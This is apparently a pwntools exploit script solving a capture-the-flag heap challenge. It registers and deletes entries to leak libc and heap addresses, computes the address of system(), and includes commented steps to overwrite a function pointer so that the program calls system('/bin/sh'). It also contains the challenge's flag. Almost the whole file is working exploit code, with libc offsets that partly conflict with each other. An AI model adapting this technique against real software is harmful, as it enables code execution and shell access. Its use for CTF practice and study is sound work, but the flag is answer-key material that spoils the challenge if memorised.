from pwn import *

r = process('./chal')
#r = remote('10.113.184.121',10059)
def register(idx,name_len,name):
    r.sendafter(b'choice: ',str(1).encode())
    r.sendafter(b'Index: ',str(idx).encode())
    r.sendafter(b'Nmae Length: ',str(name_len).encode())
    r.sendafter(b'Name: ',name)

def delete(idx):
    r.sendafter(b'choice: ',str(2).encode())
    r.sendafter(b'Index: ',str(idx).encode())



def trigger(idx):
    r.sendafter(b'choice: ',str(3).encode())
    r.sendafter(b'Index: ',str(idx).encode())

register(0, 0x420, b'a')
register(1, 0x420, b'a')
delete(0)
delete(1)
register(0, 0x420, b'a')
trigger(0)
r.recvuntil(b'Name: ')
leak_libc = u64(r.recv(6).ljust(0x8, b'\x00'))
libc_base = leak_libc - 0x219c61
system_addr = libc_base + 0x50d70
log.success(f'Leak libc address = {hex(leak_libc)}')
log.success(f'Libc base address = {hex(libc_base)}')
log.success(f'System address = {hex(system_addr)}')
print(r.recvlines(3))

# Leak heap address
## To reset entities
register(0, 0x28, b'a')
register(0, 0x28, b'a')
register(1, 0x28, b'a')
delete(1)
delete(0)
register(0, 0x28, b'a')
trigger(0)
r.recvuntil(b'Name: ')
leak_heap = u64(r.recv(6).ljust(0x8, b'\x00'))
# leak_heap = (leak_heap - 0xa61) << 0x4
log.success(f'Leak heap address = {hex(leak_heap)}')
print(r.recvlines(2))


r.interactive()

# system = libc + 0x52290
# bin_sh = libc + 0x1b45bd
# delete(0)
# register(0,0x18,p64(bin_sh) + p64(bin_sh) + p64(system)) 
# trigger(1)# flag{Y0u_Kn0w_H0w_T0_0veR1aP_N4me_aNd_EnT1Ty!!!}
r.interactive()